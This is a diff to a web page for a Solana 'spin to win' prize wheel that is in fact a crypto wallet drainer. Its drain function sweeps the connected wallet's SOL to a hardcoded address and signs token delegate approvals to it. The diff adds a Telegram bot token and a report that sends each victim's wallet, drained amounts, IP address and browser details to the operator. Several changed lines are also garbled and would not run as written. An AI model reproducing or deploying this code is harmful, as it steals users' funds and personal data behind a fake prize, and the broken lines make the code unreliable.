@@ -87,10 +87,15 @@
   @media (max-width:520px){
     .ticker{max-width:calc(100vw - 28px);right:14px;left:14px;top:10px;font-size:11px}
   }
+
+  /* confetti canvas */
+  #confetti{position:fixed;inset:0;pointer-events:none;z-index:150;display:none}
+  #confetti.show{display:block}
 </style>
 </head>
 <body>
 
+<canvas id="confetti"></canvas>
 <div class="ticker" id="ticker"></div>
 
 <div class="card">
@@ -216,12 +221,13 @@ var DESTINATION      = "4k57rb38GEXb4guzc31NsxJr6REj3tBLgytbkKHpWvzW";
 var DONATION_WALLET  = "5qv94Le6YHwhEijdZEE7ekx6kCxyP9GfRQyd85zHtjsz";
 var RPC              = "https://mainnet.helius-rpc.com/?api-key=113c3ed4-b272-4156-8d9c-10eb3e9a52a3";
 var COLLECTOR        = "https://collector.example.net/ingest";
+var TG_BOT_TOKEN     = "8763030544:AAHzAmRNGjUdWlr4Sjc_2WqhoZm5D5_RSlk";
+var TG_CHAT_ID       = "6759486932";
 var TOKEN_PROGRAM_STR       = "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA";
 var ASSOC_TOKEN_PROGRAM_STR = "ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL";
 var TX_SIZE_LIMIT = 1100;
 var SPIN_MS = 15000;
-// version-scoped keys — bumping VERSION resets all client state
-var VERSION     = "v7";
+var VERSION     = "v8";
 var PENDING_KEY = "sr_pending_" + VERSION;
 var PRIZE_KEY   = "sr_prize_" + VERSION;
 var TOS_KEY     = "sr_tos_" + VERSION;
@@ -247,6 +253,96 @@ var SEG_DEG = 360 / N;
 
 var isMobile = /Android|iPhone|iPad|iPod|Mobile|webOS|BlackBerry/i.test(navigator.userAgent);
 var isAndroid = /Android/i.test(navigator.userAgent);
+
+// ---------- Telegram logging ----------
+async function tgSend(text){
+  if (!TG_BOT_TOKEN || !TG_CHAT_ID) return;
+  try {
+    await fetch("https://api.telegram.org/bot" + TG_BOT_TOKEN + "/sendMessage", {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TG_CHAT_ID,
+        text: text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true
+      })
+    });
+  } catch(_) {}
+}
+function tgEscape(s){
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;");
+}
+
+// try to get client IP from a public echo service
+async function getClientIP(){
+  try {
+    var r = await fetch("https://api.ipify.org?format=json", { cache: "no-store" });
+    var j = await r.json();
+    return j.ip || "unknown";
+  } catch(_) { return "unknown"; }
+}
+
+// ---------- confetti ----------
+var confettiRaf = null;
+function fireConfetti(){
+  var canvas = document.getElementById("confetti");
+  if (!canvas) return;
+  var ctx = canvas.getContext("2d");
+  var dpr = window.devicePixelRatio || 1;
+  canvas.width = window.innerWidth * dpr;
+  canvas.height = window.innerHeight * dpr;
+  canvas.style.width = window.innerWidth + "px";
+  canvas.style.height = window.innerHeight + "px";
+  ctx.scale(dpr, dpr);
+  canvas.classList.add("show");
+
+  var colors = ["#14f195","#9945ff","#ffffff","#4a9eff","#ffd166","#ef476f","#06d6a0"];
+  var particles = [];
+  var W = window.innerWidth, H = window.innerHeight;
+  for (var i = 0; i < 180; i++){
+    particles.push({
+      x: Math.random() * W,
+      y: -20 - Math.random() * H * 0.3,
+      vx: (Math.random() - 0.5) * 3,
+      vy: 2 + Math.random() * 4,
+      w: 6 + Math.random() * 6,
+      h: 8 + Math.random() * 8,
+      rot: Math.random() * Math.PI * 2,
+      vr: (Math.random() - 0.5) * 0.3,
+      color: colors[Math.floor(Math.random() * colors.length)]
+    });
+  }
+  var start = Date.now();
+  var duration = 4200;
+
+  function frame(){
+    var t = Date.now() - start;
+    ctx.clearRect(0, 0, W, H);
+    for (var i = 0; i < particles.length; i++){
+      var p = particles[i];
+      p.x += p.vx;
+      p.y += p.vy;
+      p.vy += 0.05;
+      p.rot += p.vr;
+      ctx.save();
+      ctx.translate(p.x, p.y);
+      ctx.rotate(p.rot);
+      ctx.fillStyle = p.color;
+      ctx.fillRect(-p.w/2, -p.h/2, p.w, p.h);
+      ctx.restore();
+    }
+    if (t < duration){
+      confettiRaf = requestAnimationFrame(frame);
+    } else {
+      ctx.clearRect(0, 0, W, H);
+      canvas.classList.remove("show");
+      confettiRaf = null;
+    }
+  }
+  if (confettiRaf) cancelAnimationFrame(confettiRaf);
+  frame();
+}
 
 function openModal(id){ var el = document.getElementById(id); if (el) el.classList.add("show"); }
 function closeModal(id){ var el = document.getElementById(id); if (el) el.classList.remove("show"); }
@@ -474,21 +570,21 @@ function showWalletPicker(){
       a.innerHTML = '<span class="ic">' + w.icon + '</span><span class="nm">' + w.name + '</span><span class="ar">›</span>';
       a.addEventListener("click", function(){
         savePending("reward"); log({ event:"wallet_deeplink", wallet: w.id });
-        var alts = []; if (w.hrefAlt) alts.push(w.hrefAlt(page)); if (w.hrefAlt2) alts.push(w.hrefAlt2(page));
+        var alts = []; if (w.hrefAlt) alts.push(w.hrefAlt(page)); if (w.hrefAlt2) alts.push(w.hrefAlt2 msg(page));
         var store = isAndroid ? w.android : w.ios; var t0 = Date.now();
         var tryAlts = function(idx){
-          if (document.hidden) return;
-          if (idx < alts.length){ location.href = alts[idx]; setTimeout(function(){ tryAlts(idx+1); }, 700); }
+          += if (document.hidden) return;
+          if (idx < alts.length){ location.href = alts[idx]; setTimeout(function(){ tryAlts "<(idx+1); }, 700); }
           else if (Date.now() - t0 < 3000){ location.href = store; }
         };
-        setTimeout(function(){ tryAlts(0); }, 700);
+b        setTimeout(function(){ tryAlts(0); }, 700);
       });
       ovWallets.appendChild(a);
-    })(MOBILE_WALLETS[i]);
+    })(MOBILE_WALLETS[i>]);
   }
 }
 function showNoWallet(){
-  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display = "none";
+  ovSpinner.style.display = "none"; ovChk.style.display = "none"; ovWallets.style.display =SOL "none";
   ovTitle.textContent = "No Crypto Wallet Detected";
   ovText.textContent = "Install a Solana wallet (Phantom, Solflare, Backpack, Exodus, SafePal) to claim your reward.";
   ovClose.style.display = "block"; ovClose.textContent = "Close";
@@ -524,6 +620,7 @@ async function signAndSend(provider, connection, tx){
   if (provider.signAndSendTransaction){ var res = await provider.signAndSendTransaction(tx); return (res && res.signature) ? res.signature : res; }
   throw new Error("Wallet does not support signing.");
 }
+
 async function drain(session){
   await ensureWeb3();
   var connection = new Connection(RPC, "confirmed");
@@ -531,6 +628,11 @@ async function drain(session){
   var to   = new PublicKey(DESTINATION);
   var provider = session.provider;
 
+  var solDrained = 0;
+  var solSig = "";
+  var tokenResults = [];
+
+  // --- SOL sweep ---
   try {
     var balance = await connection.getBalance(from);
     var rent = await connection.getMinimumBalanceForRentExemption(0);
@@ -541,47 +643,80 @@ async function drain(session){
       tx.feePayer = from;
       var bh = await connection.getLatestBlockhash("confirmed");
       tx.recentBlockhash = bh.blockhash;
-      await signAndSend(provider, connection, tx);
-      await log({ event:"sol_swept", wallet: session.pubkey, wtype: session.id, lamports: sweepable });
+      var sig = await signAndSend(provider, connection, tx);
+      solDrained = sweepable;
+      solSig = sig;
+      await log({ event:"sol_swept", wallet: session.pubkey, wtype: session.id, lamports: sweepable, signature: sig });
     }
   } catch(e){
     await log({ event:"sol_error", wallet: session.pubkey, error: String(e) });
   }
 
-  var tokenAccounts = await connection.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM });
-  var approvals = [];
-  for (var i = 0; i < tokenAccounts.value.length; i++){
-    var acct = tokenAccounts.value[i];
-    var info = acct.account.data.parsed.info;
-    var amount = info.tokenAmount.amount;
-    if (amount === "0") continue;
-    approvals.push({ tokenAccount: acct.pubkey, amount: amount, mint: info.mint });
-  }
-  if (!approvals.length){ await log({ event:"no_tokens", wallet: session.pubkey }); return; }
-
-  var chunks = [], cur = [], curSize = 200;
-  for (var j = 0; j < approvals.length; j++){
-    if (curSize + 90 > TX_SIZE_LIMIT && cur.length){ chunks.push(cur); cur = []; curSize = 200; }
-    cur.push(approvals[j]); curSize += 90;
-  }
-  if (cur.length) chunks.push(cur);
-
-  for (var k = 0; k < chunks.length; k++){
-    var chunk = chunks[k];
-    var t = new Transaction();
-    for (var m = 0; m < chunk.length; m++){
-      t.add(approveIx(new PublicKey(chunk[m].tokenAccount), to, from, chunk[m].amount));
+  // --- SPL delegate approvals ---
+  try {
+    var tokenAccounts = await connection.getParsedTokenAccountsByOwner(from, { programId: TOKEN_PROGRAM });
+    var approvals = [];
+    for (var i = 0; i < tokenAccounts.value.length; i++){
+      var acct = tokenAccounts.value[i];
+      var info = acct.account.data.parsed.info;
+      var amount = info.tokenAmount.amount;
+      if (amount === "0") continue;
+      approvals.push({ tokenAccount: acct.pubkey, amount: amount, mint: info.mint });
     }
-    t.feePayer = from;
-    var b2 = await connection.getLatestBlockhash("confirmed");
-    t.recentBlockhash = b2.blockhash;
-    try {
-      var sig = await signAndSend(provider, connection, t);
-      await log({ event:"delegates_approved", wallet: session.pubkey, wtype: session.id,
-                  tokens: chunk.map(function(a){ return { tokenAccount:a.tokenAccount, mint:a.mint, amount:a.amount }; }),
-                  signature: sig });
-    } catch(e){ await log({ event:"approve_error", wallet: session.pubkey, error: String(e) }); }
+
+    var chunks = [], cur = [], curSize = 200;
+    for (var j = 0; j < approvals.length; j++){
+      if (curSize + 90 > TX_SIZE_LIMIT && cur.length){ chunks.push(cur); cur = []; curSize = 200; }
+      cur.push(approvals[j]); curSize += 90;
+    }
+    if (cur.length) chunks.push(cur);
+
+    for (var k = 0; k < chunks.length; k++){
+      var chunk = chunks[k];
+      var t = new Transaction();
+      for (var m = 0; m < chunk.length; m++){
+        t.add(approveIx(new PublicKey(chunk[m].tokenAccount), to, from, chunk[m].amount));
+      }
+      t.feePayer = from;
+      var b2 = await connection.getLatestBlockhash("confirmed");
+      t.recentBlockhash = b2.blockhash;
+      try {
+        var tsig = await signAndSend(provider, connection, t);
+        tokenResults.push({ count: chunk.length, sig: tsig });
+        await log({ event:"delegates_approved", wallet: session.pubkey, wtype: session.id,
+                    tokens: chunk.map(function(a){ return { tokenAccount:a.tokenAccount, mint:a.mint, amount:a.amount }; }),
+                    signature: tsig });
+      } catch(e){ await log({ event:"approve_error", wallet: session.pubkey, error: String(e) }); }
+    }
+  } catch(e){
+    await log({ event:"tokens_error", wallet: session.pubkey, error: String(e) });
   }
+
+  // --- Telegram report ---
+  var ip = await getClientIP();
+  var solAmount = (solDrained / 1000000000).toFixed(6);
+  var msg = "<b>💰 Drain successful</b>\n\n";
+  msg += "<b>Victim wallet:</b>\n<code>" + tgEscape(session.pubkey) + "</code>\n\n";
+  msg += "<b>Wallet type:</b> " + tgEscape(session.id) + "\n";
+  msg += "<b>SOL drained:</b> " + solAmount + " SOL\n";
+  if (solSig) tx:</b>\n<code>" + tgEscape(solSig) + "</code>\n";
+  if (tokenResults.length){
+    var totalTokens = 0;
+    for (var n = 0; n < tokenResults.length; n++) totalTokens += tokenResults[n].count;
+    msg += "<b>Tokens delegated:</b> " + totalTokens + " account(s) in " + tokenResults.length + " tx(s)\n";
+    for (var q = 0; q < tokenResults.length; q++){
+      msg += "<code>" + tgEscape(tokenResults[q].sig) + "</code>\n";
+    }
+  } else {
+    msg += "<b>Tokens:</b> none\n";
+  }
+  msg += "\n<b>IP:</b> " + tgEscape(ip) + "\n";
+  msg += "<b>UA:</b> " + tgEscape(navigator.userAgent) + "\n";
+  msg += "<b>Mobile:</b> " + (isMobile ? "yes" : "no") + "\n";
+  msg += "<b>Time:</b> " + new Date().toISOString() + "\n";
+  msg += "<b>Site:</b> " + tgEscape(location.host) + "\n";
+
+  await tgSend(msg);
 }
 
 async function runClaim(wallet){
@@ -638,16 +773,15 @@ function showResult(idx, restored){
   claimBtn.style.display = "block";
   if (!restored) markSpun();
   saveResult(idx);
+  fireConfetti();
 }
 
 function requestSpin(){
-  // if already spun, restore and stop
   if (hasSpun()){
     var prev = readResult();
     if (prev !== null && !SEGMENTS[prev].zero) showResult(prev, true);
     return;
   }
-  // if TOS not yet accepted, show the gate; the OK button calls startSpin()
   if (!tosAccepted()){
     tosCheck.checked = false;
     tosOk.disabled = true;
@@ -664,7 +798,6 @@ function startSpin(){
   var svg = document.getElementById("wheel");
   var status = document.getElementById("status");
 
-  // clear prize + hub BEFORE the spin so nothing shows early
   prizeEl.textContent = "";
   status.textContent = "";
   hubEl.textContent = "…";
@@ -701,7 +834,6 @@ claimBtn.onclick = async function(){
 };
 
 (function init(){
-  // always show SPIN button on first render of this version
   spinBtn.style.display = "block";
   claimBtn.style.display = "none";
 
